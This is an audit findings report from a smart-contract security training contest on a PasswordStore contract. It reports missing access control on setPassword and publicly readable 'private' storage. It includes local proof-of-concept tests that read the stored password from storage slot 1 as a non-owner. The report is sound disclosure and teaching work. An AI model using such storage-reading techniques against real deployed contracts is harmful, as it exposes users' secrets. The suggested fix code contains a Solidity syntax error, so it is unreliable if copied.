# First Flight #1: PasswordStore - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Improper Access Control](#H-01)
  - ### [H-02. Broken Access control](#H-02)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #1

### Dates: Oct 18th, 2023 - Oct 25th, 2023

[See more contest details here](https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 2
- Medium: 0

# High Risk Findings

## <a id='H-01'></a>H-01. Improper Access Control

## Summary

No access check in `setPassword` function.

## Vulnerability Details

Any one call the `setPassword` function and change the value of the `s_password` variable.

## Impact

Anyone can change the password stored inside the contract.

## Tools Used

Manual review, Ape.

## Recommendations

Add checks to see if the sender is the owner of the password or not

```js
modifier onlyOwner {
    require(msg.sender == owner);
    _;
}

function setPassword(string memory newPassword) external onlyOwner{
        s_password = newPassword;
        emit SetNetPassword();
}

// or

// again this can be read from contract storage. better to save sensitive info off-chain
mapping(address => string) Passwords private;

function setPassword(string memory newPassword) external onlyOwner{
        Passwords[msg.sender] = newPassword;
        emit SetNetPassword();
}
```

## <a id='H-02'></a>H-02. Broken Access control

# Broken Access control

## Summary

All storage is publicly visible on the blockchain, even private variables.

## Vulnerability Details

According to Solidity documentation, `statically-sized` variables (everything except mapping and dynamically-sized array types) are laid out contiguously in storage starting from position `0`. Multiple items that need less than `32 bytes` are packed into a single storage slot if possible.

## Impact

Anyone can read the password and the account associated with it. Which violates the whole idea of a password magagement system.

## POC

### ApeWorX

1. Setup an ape environment using `ape init`.

1. Setup `conftest.py` like this

```py
import ape
import pytest
from ape import project


@pytest.fixture(scope="session")
def accounts():
    return ape.accounts


@pytest.fixture(scope="session")
def test_accounts(accounts):
    return accounts.test_accounts


@pytest.fixture
def owner(test_accounts):
    return test_accounts[-1]


@pytest.fixture
def attacker(test_accounts):
    return test_accounts[-2]


@pytest.fixture
def PasswordStore(owner):
    return project.PasswordStore.deploy(sender=owner)
```

3. Setup the test file like this

```py
from ape import networks


def test_read_password_from_storage(owner, attacker, PasswordStore):
    password = "super_password"

    PasswordStore.setPassword(password, sender=owner)

    passwd = (
        networks.provider.get_storage_at(PasswordStore.address, 1)
        .decode()
        .replace("\x00", "")  # noqa
    ).strip()

    assert password == passwd
```

4. Run it using `ape test tests/bug_tests.py`.

### Foundry

1. The approach is same.

```js
// https://ethereum.stackexchange.com/questions/2519/how-to-convert-a-bytes32-to-string

function bytes32ToString(bytes32 _bytes32) public pure returns (string memory) {
        uint8 i = 0;
        while (i < 32 && _bytes32[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return string(bytesArray);
    }

function test_read_password_from_storage() public {
        vm.startPrank(owner);
        string memory expectedPassword = "myNewPassword";
        passwordStore.setPassword(expectedPassword);

        vm.startPrank(address(2));
        bytes32 password = vm.load(address(passwordStore), bytes32(uint256(1)));

        assertEq(bytes32ToString(password), expectedPassword);
    }
```

2. Run `forge test --match-path test/PasswordStore.t.sol -vvvvv`

## Tools Used

Manual Review, ApeWorX, Foundry.

## Recommendations

Never store passwords and private keys without hashing them first.

## References

- https://medium.com/coinmonks/ethernaut-lvl-12-privacy-walkthrough-how-ethereum-optimizes-storage-to-save-space-and-be-less-c9b01ec6adb6
